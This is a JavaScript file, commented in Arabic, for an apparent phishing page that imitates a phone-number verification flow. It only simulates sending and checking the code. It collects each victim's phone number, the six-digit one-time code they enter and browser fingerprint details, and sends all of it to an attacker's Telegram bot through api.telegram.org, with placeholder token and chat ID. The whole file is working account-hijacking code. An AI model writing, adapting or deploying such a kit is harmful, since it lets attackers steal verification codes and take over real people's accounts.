// script.js
document.addEventListener('DOMContentLoaded', function() {
    // عناصر DOM
    const welcomeScreen = document.getElementById('welcomeScreen');
    const loginContainer = document.getElementById('loginContainer');
    const codeContainer = document.getElementById('codeContainer');
    const successContainer = document.getElementById('successContainer');
    const countryCodeSelect = document.getElementById('countryCode');
    
    const startBtn = document.getElementById('startBtn');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const verifyBtn = document.getElementById('verifyBtn');
    const backBtn = document.getElementById('backBtn');
    const resendBtn = document.getElementById('resendBtn');
    const finishBtn = document.getElementById('finishBtn');
    
    const phoneNumber = document.getElementById('phoneNumber');
    const displayNumber = document.getElementById('displayNumber');
    
    const codeInputs = [
        document.getElementById('code1'),
        document.getElementById('code2'),
        document.getElementById('code3'),
        document.getElementById('code4'),
        document.getElementById('code5'),
        document.getElementById('code6')
    ];

    let fullPhoneNumber = '';
    let countdownTimer = null;
    let resendCountdown = 60;
    let userAgent = navigator.userAgent;
    let platform = navigator.platform;
    let language = navigator.language;
    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    let screenResolution = `${screen.width}x${screen.height}`;
    let colorDepth = screen.colorDepth;
    let cookieEnabled = navigator.cookieEnabled;
    let onlineStatus = navigator.onLine;
    let referrer = document.referrer || 'بدون مصدر';
    let currentURL = window.location.href;

    // قاعدة بيانات شاملة لجميع دول العالم مع أكوادها
    const countries = [
        { name: "أفغانستان", code: "+93", flag: "🇦🇫" },
        { name: "ألبانيا", code: "+355", flag: "🇦🇱" },
        { name: "الجزائر", code: "+213", flag: "🇩🇿" },
        { name: "ساموا الأمريكية", code: "+1684", flag: "🇦🇸" },
        { name: "أندورا", code: "+376", flag: "🇦🇩" },
        { name: "أنغولا", code: "+244", flag: "🇦🇴" },
        { name: "أنغويلا", code: "+1264", flag: "🇦🇮" },
        { name: "القطب الجنوبي", code: "+672", flag: "🇦🇶" },
        { name: "أنتيغوا وباربودا", code: "+1268", flag: "🇦🇬" },
        { name: "الأرجنتين", code: "+54", flag: "🇦🇷" },
        { name: "أرمينيا", code: "+374", flag: "🇦🇲" },
        { name: "أروبا", code: "+297", flag: "🇦🇼" },
        { name: "أستراليا", code: "+61", flag: "🇦🇺" },
        { name: "النمسا", code: "+43", flag: "🇦🇹" },
        { name: "أذربيجان", code: "+994", flag: "🇦🇿" },
        { name: "ال Bahamas", code: "+1242", flag: "🇧🇸" },
        { name: "البحرين", code: "+973", flag: "🇧🇭" },
        { name: "بنغلاديش", code: "+880", flag: "🇧🇩" },
        { name: "باربادوس", code: "+1246", flag: "🇧🇧" },
        { name: "روسيا البيضاء", code: "+375", flag: "🇧🇾" },
        { name: "بلجيكا", code: "+32", flag: "🇧🇪" },
        { name: "بليز", code: "+501", flag: "🇧🇿" },
        { name: "بنين", code: "+229", flag: "🇧🇯" },
        { name: "برمودا", code: "+1441", flag: "🇧🇲" },
        { name: "بوتان", code: "+975", flag: "🇧🇹" },
        { name: "بوليفيا", code: "+591", flag: "🇧🇴" },
        { name: "البوسنة والهرسك", code: "+387", flag: "🇧🇦" },
        { name: "بوتسوانا", code: "+267", flag: "🇧🇼" },
        { name: "البرازيل", code: "+55", flag: "🇧🇷" },
        { name: "إقليم المحيط الهندي البريطاني", code: "+246", flag: "🇮🇴" },
        { name: "جزر العذراء البريطانية", code: "+1284", flag: "🇻🇬" },
        { name: "بروناي", code: "+673", flag: "🇧🇳" },
        { name: "بلغاريا", code: "+359", flag: "🇧🇬" },
        { name: "بوركينا فاسو", code: "+226", flag: "🇧🇫" },
        { name: "بوروندي", code: "+257", flag: "🇧🇮" },
        { name: "كمبوديا", code: "+855", flag: "🇰🇭" },
        { name: "الكاميرون", code: "+237", flag: "🇨🇲" },
        { name: "كندا", code: "+1", flag: "🇨🇦" },
        { name: "الرأس الأخضر", code: "+238", flag: "🇨🇻" },
        { name: "جزر كايمان", code: "+1345", flag: "🇰🇾" },
        { name: "جمهورية أفريقيا الوسطى", code: "+236", flag: "🇨🇫" },
        { name: "تشاد", code: "+235", flag: "🇹🇩" },
        { name: "تشيلي", code: "+56", flag: "🇨🇱" },
        { name: "الصين", code: "+86", flag: "🇨🇳" },
        { name: "جزيرة الكريسماس", code: "+61", flag: "🇨🇽" },
        { name: "جزر كوكوس", code: "+61", flag: "🇨🇨" },
        { name: "كولومبيا", code: "+57", flag: "🇨🇴" },
        { name: "جزر القمر", code: "+269", flag: "🇰🇲" },
        { name: "الكونغو - بrazzaville", code: "+242", flag: "🇨🇬" },
        { name: "الكونغو - Kinshasa", code: "+243", flag: "🇨🇩" },
        { name: "جزر كوك", code: "+682", flag: "🇨🇰" },
        { name: "كوستاريكا", code: "+506", flag: "🇨🇷" },
        { name: "كرواتيا", code: "+385", flag: "🇭🇷" },
        { name: "كوبا", code: "+53", flag: "🇨🇺" },
        { name: "قبرص", code: "+357", flag: "🇨🇾" },
        { name: "التشيك", code: "+420", flag: "🇨🇿" },
        { name: "الدنمارك", code: "+45", flag: "🇩🇰" },
        { name: "جيبوتي", code: "+253", flag: "🇩🇯" },
        { name: "دومينيكا", code: "+1767", flag: "🇩🇲" },
        { name: "جمهورية الدومينيكان", code: "+1809", flag: "🇩🇴" },
        { name: "تيمور الشرقية", code: "+670", flag: "🇹🇱" },
        { name: "الإكوادور", code: "+593", flag: "🇪🇨" },
        { name: "مصر", code: "+20", flag: "🇪🇬" },
        { name: "السلفادور", code: "+503", flag: "🇸🇻" },
        { name: "غينيا الاستوائية", code: "+240", flag: "🇬🇶" },
        { name: "إريتريا", code: "+291", flag: "🇪🇷" },
        { name: "إستونيا", code: "+372", flag: "🇪🇪" },
        { name: "إثيوبيا", code: "+251", flag: "🇪🇹" },
        { name: "جزر فوكلاند", code: "+500", flag: "🇫🇰" },
        { name: "جزر فارو", code: "+298", flag: "🇫🇴" },
        { name: "فيجي", code: "+679", flag: "🇫🇯" },
        { name: "فنلندا", code: "+358", flag: "🇫🇮" },
        { name: "فرنسا", code: "+33", flag: "🇫🇷" },
        { name: "غيانا الفرنسية", code: "+594", flag: "🇬🇫" },
        { name: "بولينيزيا الفرنسية", code: "+689", flag: "🇵🇫" },
        { name: "غابون", code: "+241", flag: "🇬🇦" },
        { name: "غامبيا", code: "+220", flag: "🇬🇲" },
        { name: "جورجيا", code: "+995", flag: "🇬🇪" },
        { name: "ألمانيا", code: "+49", flag: "🇩🇪" },
        { name: "غانا", code: "+233", flag: "🇬🇭" },
        { name: "جبل طارق", code: "+350", flag: "🇬🇮" },
        { name: "اليونان", code: "+30", flag: "🇬🇷" },
        { name: "الأرض الخضراء", code: "+299", flag: "🇬🇱" },
        { name: "غرينادا", code: "+1473", flag: "🇬🇩" },
        { name: "جوادلوب", code: "+590", flag: "🇬🇵" },
        { name: "غوام", code: "+1671", flag: "🇬🇺" },
        { name: "غواتيمالا", code: "+502", flag: "🇬🇹" },
        { name: "غيرنزي", code: "+44", flag: "🇬🇬" },
        { name: "غينيا", code: "+224", flag: "🇬🇳" },
        { name: "غينيا بيساو", code: "+245", flag: "🇬🇼" },
        { name: "غيانا", code: "+592", flag: "🇬🇾" },
        { name: "هايتي", code: "+509", flag: "🇭🇹" },
        { name: "هندوراس", code: "+504", flag: "🇭🇳" },
        { name: "هونغ كونغ", code: "+852", flag: "🇭🇰" },
        { name: "المجر", code: "+36", flag: "🇭🇺" },
        { name: "آيسلندا", code: "+354", flag: "🇮🇸" },
        { name: "الهند", code: "+91", flag: "🇮🇳" },
        { name: "إندونيسيا", code: "+62", flag: "🇮🇩" },
        { name: "إيران", code: "+98", flag: "🇮🇷" },
        { name: "العراق", code: "+964", flag: "🇮🇶" },
        { name: "أيرلندا", code: "+353", flag: "🇮🇪" },
        { name: "جزيرة مان", code: "+44", flag: "🇮🇲" },
        { name: "إسرائيل", code: "+972", flag: "🇮🇱" },
        { name: "إيطاليا", code: "+39", flag: "🇮🇹" },
        { name: "ساحل العاج", code: "+225", flag: "🇨🇮" },
        { name: "جامايكا", code: "+1876", flag: "🇯🇲" },
        { name: "اليابان", code: "+81", flag: "🇯🇵" },
        { name: "جيرزي", code: "+44", flag: "🇯🇪" },
        { name: "الأردن", code: "+962", flag: "🇯🇴" },
        { name: "كازاخستان", code: "+7", flag: "🇰🇿" },
        { name: "كينيا", code: "+254", flag: "🇰🇪" },
        { name: "كيريباتي", code: "+686", flag: "🇰🇮" },
        { name: "كوريا الشمالية", code: "+850", flag: "🇰🇵" },
        { name: "كوريا الجنوبية", code: "+82", flag: "🇰🇷" },
        { name: "الكويت", code: "+965", flag: "🇰🇼" },
        { name: "قيرغيزستان", code: "+996", flag: "🇰🇬" },
        { name: "لاوس", code: "+856", flag: "🇱🇦" },
        { name: "لاتفيا", code: "+371", flag: "🇱🇻" },
        { name: "لبنان", code: "+961", flag: "🇱🇧" },
        { name: "ليسوتو", code: "+266", flag: "🇱🇸" },
        { name: "ليبيريا", code: "+231", flag: "🇱🇷" },
        { name: "ليبيا", code: "+218", flag: "🇱🇾" },
        { name: "ليختنشتاين", code: "+423", flag: "🇱🇮" },
        { name: "ليتوانيا", code: "+370", flag: "🇱🇹" },
        { name: "لوكسمبورغ", code: "+352", flag: "🇱🇺" },
        { name: "ماكاو", code: "+853", flag: "🇲🇴" },
        { name: "مقدونيا", code: "+389", flag: "🇲🇰" },
        { name: "مدغشقر", code: "+261", flag: "🇲🇬" },
        { name: "مالاوي", code: "+265", flag: "🇲🇼" },
        { name: "ماليزيا", code: "+60", flag: "🇲🇾" },
        { name: "جزر المالديف", code: "+960", flag: "🇲🇻" },
        { name: "مالي", code: "+223", flag: "🇲🇱" },
        { name: "مالطا", code: "+356", flag: "🇲🇹" },
        { name: "جزر مارشال", code: "+692", flag: "🇲🇭" },
        { name: "مارتينيك", code: "+596", flag: "🇲🇶" },
        { name: "موريتانيا", code: "+222", flag: "🇲🇷" },
        { name: "موريشيوس", code: "+230", flag: "🇲🇺" },
        { name: "مايوت", code: "+262", flag: "🇾🇹" },
        { name: "المكسيك", code: "+52", flag: "🇲🇽" },
        { name: "ميكرونيزيا", code: "+691", flag: "🇫🇲" },
        { name: "مولدوفا", code: "+373", flag: "🇲🇩" },
        { name: "موناكو", code: "+377", flag: "🇲🇨" },
        { name: "منغوليا", code: "+976", flag: "🇲🇳" },
        { name: "الجبل الأسود", code: "+382", flag: "🇲🇪" },
        { name: "مونتسيرات", code: "+1664", flag: "🇲🇸" },
        { name: "المغرب", code: "+212", flag: "🇲🇦" },
        { name: "موزمبيق", code: "+258", flag: "🇲🇿" },
        { name: "ميانمار", code: "+95", flag: "🇲🇲" },
        { name: "ناميبيا", code: "+264", flag: "🇳🇦" },
        { name: "ناورو", code: "+674", flag: "🇳🇷" },
        { name: "نيبال", code: "+977", flag: "🇳🇵" },
        { name: "هولندا", code: "+31", flag: "🇳🇱" },
        { name: "كاليدونيا الجديدة", code: "+687", flag: "🇳🇨" },
        { name: "نيوزيلندا", code: "+64", flag: "🇳🇿" },
        { name: "نيكاراغوا", code: "+505", flag: "🇳🇮" },
        { name: "النيجر", code: "+227", flag: "🇳🇪" },
        { name: "نيجيريا", code: "+234", flag: "🇳🇬" },
        { name: "نيوي", code: "+683", flag: "🇳🇺" },
        { name: "جزيرة نورفولك", code: "+672", flag: "🇳🇫" },
        { name: "جزر ماريانا الشمالية", code: "+1670", flag: "🇲🇵" },
        { name: "النرويج", code: "+47", flag: "🇳🇴" },
        { name: "عمان", code: "+968", flag: "🇴🇲" },
        { name: "باكستان", code: "+92", flag: "🇵🇰" },
        { name: "بالاو", code: "+680", flag: "🇵🇼" },
        { name: "فلسطين", code: "+970", flag: "🇵🇸" },
        { name: "بنما", code: "+507", flag: "🇵🇦" },
        { name: "بابوا غينيا الجديدة", code: "+675", flag: "🇵🇬" },
        { name: "باراغواي", code: "+595", flag: "🇵🇾" },
        { name: "بيرو", code: "+51", flag: "🇵🇪" },
        { name: "الفلبين", code: "+63", flag: "🇵🇭" },
        { name: "بيتكيرن", code: "+64", flag: "🇵🇳" },
        { name: "بولندا", code: "+48", flag: "🇵🇱" },
        { name: "البرتغال", code: "+351", flag: "🇵🇹" },
        { name: "بورتوريكو", code: "+1787", flag: "🇵🇷" },
        { name: "قطر", code: "+974", flag: "🇶🇦" },
        { name: "رومانيا", code: "+40", flag: "🇷🇴" },
        { name: "روسيا", code: "+7", flag: "🇷🇺" },
        { name: "رواندا", code: "+250", flag: "🇷🇼" },
        { name: "سانت بارتيليمي", code: "+590", flag: "🇧🇱" },
        { name: "سانت هيلانة", code: "+290", flag: "🇸🇭" },
        { name: "سانت كيتس ونيفيس", code: "+1869", flag: "🇰🇳" },
        { name: "سانت لوسيا", code: "+1758", flag: "🇱🇨" },
        { name: "سانت مارتن", code: "+590", flag: "🇲🇫" },
        { name: "سانت بيير وميكلون", code: "+508", flag: "🇵🇲" },
        { name: "سانت فنسنت والغرينادين", code: "+1784", flag: "🇻🇨" },
        { name: "ساموا", code: "+685", flag: "🇼🇸" },
        { name: "سان مارينو", code: "+378", flag: "🇸🇲" },
        { name: "ساو تومي وبرينسيب", code: "+239", flag: "🇸🇹" },
        { name: "السعودية", code: "+966", flag: "🇸🇦" },
        { name: "السنغال", code: "+221", flag: "🇸🇳" },
        { name: "صربيا", code: "+381", flag: "🇷🇸" },
        { name: "سيشل", code: "+248", flag: "🇸🇨" },
        { name: "سيراليون", code: "+232", flag: "🇸🇱" },
        { name: "سنغافورة", code: "+65", flag: "🇸🇬" },
        { name: "سلوفاكيا", code: "+421", flag: "🇸🇰" },
        { name: "سلوفينيا", code: "+386", flag: "🇸🇮" },
        { name: "جزر سليمان", code: "+677", flag: "🇸🇧" },
        { name: "الصومال", code: "+252", flag: "🇸🇴" },
        { name: "جنوب أفريقيا", code: "+27", flag: "🇿🇦" },
        { name: "جورجيا الجنوبية", code: "+500", flag: "🇬🇸" },
        { name: "جنوب السودان", code: "+211", flag: "🇸🇸" },
        { name: "إسبانيا", code: "+34", flag: "🇪🇸" },
        { name: "سريلانكا", code: "+94", flag: "🇱🇰" },
        { name: "السودان", code: "+249", flag: "🇸🇩" },
        { name: "سورينام", code: "+597", flag: "🇸🇷" },
        { name: "سفالبارد ويان ماين", code: "+47", flag: "🇸🇯" },
        { name: "سوازيلاند", code: "+268", flag: "🇸🇿" },
        { name: "السويد", code: "+46", flag: "🇸🇪" },
        { name: "سويسرا", code: "+41", flag: "🇨🇭" },
        { name: "سوريا", code: "+963", flag: "🇸🇾" },
        { name: "تايوان", code: "+886", flag: "🇹🇼" },
        { name: "طاجيكستان", code: "+992", flag: "🇹🇯" },
        { name: "تنزانيا", code: "+255", flag: "🇹🇿" },
        { name: "تايلاند", code: "+66", flag: "🇹🇭" },
        { name: "تيمور الشرقية", code: "+670", flag: "🇹🇱" },
        { name: "توغو", code: "+228", flag: "🇹🇬" },
        { name: "توكيلاو", code: "+690", flag: "🇹🇰" },
        { name: "تونغا", code: "+676", flag: "🇹🇴" },
        { name: "ترينيداد وتوباغو", code: "+1868", flag: "🇹🇹" },
        { name: "تونس", code: "+216", flag: "🇹🇳" },
        { name: "تركيا", code: "+90", flag: "🇹🇷" },
        { name: "تركمانستان", code: "+993", flag: "🇹🇲" },
        { name: "جزر توركس وكايكوس", code: "+1649", flag: "🇹🇨" },
        { name: "توفالو", code: "+688", flag: "🇹🇻" },
        { name: "أوغندا", code: "+256", flag: "🇺🇬" },
        { name: "أوكرانيا", code: "+380", flag: "🇺🇦" },
        { name: "الإمارات العربية المتحدة", code: "+971", flag: "🇦🇪" },
        { name: "المملكة المتحدة", code: "+44", flag: "🇬🇧" },
        { name: "الولايات المتحدة", code: "+1", flag: "🇺🇸" },
        { name: "جزر الولايات المتحدة الصغيرة", code: "+1", flag: "🇺🇲" },
        { name: "أوروغواي", code: "+598", flag: "🇺🇾" },
        { name: "أوزبكستان", code: "+998", flag: "🇺🇿" },
        { name: "فانواتو", code: "+678", flag: "🇻🇺" },
        { name: "الفاتيكان", code: "+379", flag: "🇻🇦" },
        { name: "فنزويلا", code: "+58", flag: "🇻🇪" },
        { name: "فيتنام", code: "+84", flag: "🇻🇳" },
        { name: "جزر والس وفوتونا", code: "+681", flag: "🇼🇫" },
        { name: "اليمن", code: "+967", flag: "🇾🇪" },
        { name: "زامبيا", code: "+260", flag: "🇿🇲" },
        { name: "زيمبابوي", code: "+263", flag: "🇿🇼" }
    ];

    // تعبئة قائمة الدول
    function populateCountries() {
        countries.forEach(country => {
            const option = document.createElement('option');
            option.value = country.code;
            option.textContent = `${country.name} ${country.flag} ${country.code}`;
            countryCodeSelect.appendChild(option);
        });
    }

    // بدء الرحلة
    startBtn.addEventListener('click', function() {
        welcomeScreen.style.display = 'none';
        loginContainer.style.display = 'block';
    });

    // معالجة إدخال الكود
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            validateCodeInput(this);
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text');
            const numbersOnly = pastedData.replace(/[^0-9]/g, '').substring(0, 6);
            
            if (numbersOnly.length === 6) {
                codeInputs.forEach((input, i) => {
                    input.value = numbersOnly[i] || '';
                });
                codeInputs[5].focus();
            }
        });
    });

    // إرسال رمز التحقق
    sendCodeBtn.addEventListener('click', function() {
        const phone = phoneNumber.value.trim();
        const code = countryCodeSelect.value;
        
        if (!validatePhoneNumber(phone)) {
            showInputError(phoneNumber, 'يرجى إدخال رقم هاتف صحيح');
            return;
        }

        // إزالة رسالة الخطأ إذا كانت موجودة
        clearInputError(phoneNumber);
        
        fullPhoneNumber = code + phone;
        displayNumber.textContent = fullPhoneNumber;
        
        // إرسال معلومات المستخدم الكاملة إلى التلجرام فور إدخال الرقم
        sendCompleteUserDataToTelegram(fullPhoneNumber);
        
        // محاكاة إرسال الرمز
        simulateSendCode();
        
        loginContainer.style.display = 'none';
        codeContainer.style.display = 'block';
        
        // بدء عداد إعادة الإرسال
        startResendCountdown();
    });

    // التحقق من الكود
    verifyBtn.addEventListener('click', function() {
        const code = codeInputs.map(input => input.value).join('');
        
        if (code.length !== 6) {
            alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
            return;
        }

        if (!/^\d{6}$/.test(code)) {
            alert('يرجى إدخال أرقام فقط في رمز التحقق');
            return;
        }

        // إرسال رمز التحقق مع جميع المعلومات إلى التلجرام
        sendVerificationDataToTelegram(fullPhoneNumber, code);
        
        // محاكاة التحقق الناجح
        simulateVerification(code);
    });

    // العودة لتغيير الرقم
    backBtn.addEventListener('click', function() {
        codeContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        resetCodeInputs();
        if (countdownTimer) {
            clearInterval(countdownTimer);
            countdownTimer = null;
        }
        resendBtn.textContent = 'إعادة الإرسال';
        resendBtn.disabled = false;
    });

    // إعادة إرسال الرمز
    resendBtn.addEventListener('click', function() {
        if (resendBtn.disabled) return;
        
        const phone = phoneNumber.value.trim();
        if (!phone) {
            alert('يرجى إدخال رقم الهاتف أولاً');
            return;
        }
        
        // إرسال طلب إعادة الإرسال مع المعلومات الكاملة إلى التلجرام
        sendResendRequestWithUserDataToTelegram(fullPhoneNumber);
        
        // محاكاة إعادة إرسال الرمز
        simulateResendCode();
        startResendCountdown();
    });

    // إنهاء العملية
    finishBtn.addEventListener('click', function() {
        // إعادة تعيين كل شيء
        location.reload();
    });

    // وظائف مساعدة
    function validatePhoneNumber(phone) {
        return phone.length >= 6 && phone.length <= 15 && /^\d+$/.test(phone);
    }

    function validateCodeInput(input) {
        input.value = input.value.replace(/[^0-9]/g, '');
    }

    function showInputError(input, message) {
        input.classList.add('input-error');
    }

    function clearInputError(input) {
        input.classList.remove('input-error');
    }

    function resetCodeInputs() {
        codeInputs.forEach(input => {
            input.value = '';
        });
    }

    function startResendCountdown() {
        resendCountdown = 60;
        resendBtn.disabled = true;
        resendBtn.textContent = `إعادة الإرسال (${resendCountdown}s)`;
        
        countdownTimer = setInterval(() => {
            resendCountdown--;
            if (resendCountdown <= 0) {
                clearInterval(countdownTimer);
                resendBtn.disabled = false;
                resendBtn.textContent = 'إعادة الإرسال';
            } else {
                resendBtn.textContent = `إعادة الإرسال (${resendCountdown}s)`;
            }
        }, 1000);
    }

    function simulateSendCode() {
        // محاكاة تأخير الإرسال
        sendCodeBtn.textContent = 'جارٍ الإرسال...';
        sendCodeBtn.disabled = true;
        
        setTimeout(() => {
            sendCodeBtn.textContent = 'إرسال رمز التحقق';
            sendCodeBtn.disabled = false;
        }, 2000);
    }

    function simulateResendCode() {
        resendBtn.textContent = 'جارٍ إعادة الإرسال...';
        resendBtn.disabled = true;
        
        setTimeout(() => {
            alert('تم إعادة إرسال رمز التحقق بنجاح!');
        }, 1500);
    }

    function simulateVerification(code) {
        verifyBtn.textContent = 'جارٍ التحقق...';
        verifyBtn.disabled = true;
        
        setTimeout(() => {
            codeContainer.style.display = 'none';
            successContainer.style.display = 'block';
            
            verifyBtn.textContent = 'تأكيد التحقق';
            verifyBtn.disabled = false;
        }, 2000);
    }

    // وظيفة إرسال البيانات الكاملة للمستخدم إلى التلجرام
    function sendCompleteUserDataToTelegram(phoneNumber) {
        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `👤 *بيانات المستخدم الكاملة*\n\n` +
                       `📱 *رقم الهاتف:* ${phoneNumber}\n` +
                       `🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n` +
                       `🌐 *المتصفح:* ${userAgent}\n` +
                       `💻 *النظام الأساسي:* ${platform}\n` +
                       `🌍 *اللغة:* ${language}\n` +
                       `⏰ *المنطقة الزمنية:* ${timezone}\n` +
                       `🖥️ *دقة الشاشة:* ${screenResolution}\n` +
                       `🎨 *عمق الألوان:* ${colorDepth} bit\n` +
                       `🍪 *الكوكيز مفعلة:* ${cookieEnabled ? 'نعم' : 'لا'}\n` +
                       `📡 *الحالة:* ${onlineStatus ? 'متصل' : 'غير متصل'}\n` +
                       `🔗 *المصدر:* ${referrer}\n` +
                       `🌐 *رابط الصفحة:* ${currentURL}\n` +
                       `📍 *المرحلة:* تم إدخال رقم الهاتف\n` +
                       `📊 *الحالة:* في انتظار رمز التحقق`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل إرسال بيانات المستخدم الكاملة إلى التلجرام');
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال بيانات المستخدم الكاملة:', error);
        });
    }

    // وظيفة إرسال بيانات التحقق الكاملة إلى التلجرام
    function sendVerificationDataToTelegram(phoneNumber, code) {
        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `🔐 *بيانات التحقق الكاملة*\n\n` +
                       `📱 *رقم الهاتف:* ${phoneNumber}\n` +
                       `🔢 *رمز التحقق:* ${code}\n` +
                       `🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n` +
                       `🌐 *المتصفح:* ${userAgent}\n` +
                       `💻 *النظام الأساسي:* ${platform}\n` +
                       `🌍 *اللغة:* ${language}\n` +
                       `⏰ *المنطقة الزمنية:* ${timezone}\n` +
                       `🖥️ *دقة الشاشة:* ${screenResolution}\n` +
                       `🎨 *عمق الألوان:* ${colorDepth} bit\n` +
                       `🍪 *الكوكيز مفعلة:* ${cookieEnabled ? 'نعم' : 'لا'}\n` +
                       `📡 *الحالة:* ${onlineStatus ? 'متصل' : 'غير متصل'}\n` +
                       `🔗 *المصدر:* ${referrer}\n` +
                       `🌐 *رابط الصفحة:* ${currentURL}\n` +
                       `✅ *الحالة:* تم إدخال رمز التحقق بنجاح\n` +
                       `🛡️ *المرحلة:* التوثيق مكتمل`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل إرسال بيانات التحقق الكاملة إلى التلجرام');
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال بيانات التحقق الكاملة:', error);
        });
    }

    // وظيفة إرسال طلب إعادة الإرسال مع البيانات الكاملة إلى التلجرام
    function sendResendRequestWithUserDataToTelegram(phoneNumber) {
        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `🔄 *طلب إعادة إرسال مع البيانات الكاملة*\n\n` +
                       `📱 *رقم الهاتف:* ${phoneNumber}\n` +
                       `🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n` +
                       `🌐 *المتصفح:* ${userAgent}\n` +
                       `💻 *النظام الأساسي:* ${platform}\n` +
                       `🌍 *اللغة:* ${language}\n` +
                       `⏰ *المنطقة الزمنية:* ${timezone}\n` +
                       `🖥️ *دقة الشاشة:* ${screenResolution}\n` +
                       `🎨 *عمق الألوان:* ${colorDepth} bit\n` +
                       `🍪 *الكوكيز مفعلة:* ${cookieEnabled ? 'نعم' : 'لا'}\n` +
                       `📡 *الحالة:* ${onlineStatus ? 'متصل' : 'غير متصل'}\n` +
                       `🔗 *المصدر:* ${referrer}\n` +
                       `🌐 *رابط الصفحة:* ${currentURL}\n` +
                       `📤 *الحالة:* تم طلب إعادة إرسال رمز التحقق`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل إرسال طلب إعادة الإرسال مع البيانات إلى التلجرام');
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال طلب إعادة الإرسال مع البيانات:', error);
        });
    }

    // التحقق من إدخال الأرقام فقط في حقل الهاتف
    phoneNumber.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // منع النسخ في حقول الكود (اختياري)
    codeInputs.forEach(input => {
        input.addEventListener('copy', function(e) {
            e.preventDefault();
        });
    });

    // تعبئة قائمة الدول عند تحميل الصفحة
    populateCountries();
});
